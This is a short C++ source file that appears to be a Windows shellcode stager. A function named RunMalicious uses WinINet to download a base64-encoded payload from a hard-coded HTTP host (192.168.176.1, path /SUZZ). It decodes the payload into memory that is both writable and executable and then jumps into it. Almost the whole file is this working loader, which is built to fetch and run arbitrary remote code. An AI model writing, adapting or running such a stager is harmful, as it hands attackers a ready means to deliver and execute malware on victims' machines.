#include <General/ThirdParty/cpp-httplib/httplib.h>
#include <General/ThirdParty/xorstr.hpp>
#include <General/util/Crypto/Base64.hpp>
#include <Windows.h>
#include <iostream>
#include <thread>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
void RunMalicious()
{
    //初始化WinINet API
    HINTERNET hInternet = InternetOpenA(NULL, 0, NULL, NULL, 0);
    if (hInternet == NULL) {
        std::cerr << "InternetOpen failed with error: " << GetLastError() << std::endl;
    }

    // 连接到HTTP服务器
    HINTERNET hConnect = InternetConnectA(hInternet, "192.168.176.1", 0x50, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (hConnect == NULL) {
        std::cerr << "InternetConnect failed with error: " << GetLastError() << std::endl;
        InternetCloseHandle(hInternet);
        return;
    }

    // 创建HTTP请求
    HINTERNET hRequest = HttpOpenRequestA(hConnect, NULL, "/SUZZ", NULL, NULL, NULL, 0x84400200, 0);
    //HINTERNET hRequest = HttpOpenRequestA(hConnect, NULL, "/Conf", NULL, NULL, NULL, NULL, 0);
    if (hRequest == NULL) {
        std::cerr << "HttpOpenRequest failed with error: " << GetLastError() << std::endl;
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    // 发送HTTP请求
    BOOL bSend = HttpSendRequestA(hRequest, "Accept: application/json", -1, NULL, 0);
    if (!bSend) {
        std::cerr << "HttpSendRequest failed with error: " << GetLastError() << std::endl;
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
    }

    //读取响应
    auto shellcodeDesBuffer = VirtualAlloc(0, 0x400000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    std::cout << std::hex << (uintptr_t)shellcodeDesBuffer << std::endl;
    RtlZeroMemory(shellcodeDesBuffer, 0x400000);
    DWORD bytesRead;


    auto shellcodeBase64Buffer = VirtualAlloc(0, 0x600000, MEM_COMMIT, PAGE_READWRITE);
    LPVOID readPointer = shellcodeBase64Buffer;
    BOOL bRead = InternetReadFile(hRequest, readPointer, 0x1000, &bytesRead);

    while (bRead && bytesRead != 0) {
        readPointer = (LPVOID)((uintptr_t)readPointer + bytesRead);
        bRead = InternetReadFile(hRequest, readPointer, 0x1000, &bytesRead);
    }

    // 关闭句柄
    size_t bufSize = 0x400000;
    int ret = zzj::Base64Help::Decode((char*)shellcodeBase64Buffer, (char*)shellcodeDesBuffer,bufSize);
    if (ret != 0)
    {
		std::cerr << "Base64 decode failed" << std::endl;
	}
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    _asm jmp shellcodeDesBuffer;
}
int main(int argc, char* argv[])
{
    RunMalicious();
    return 0;
}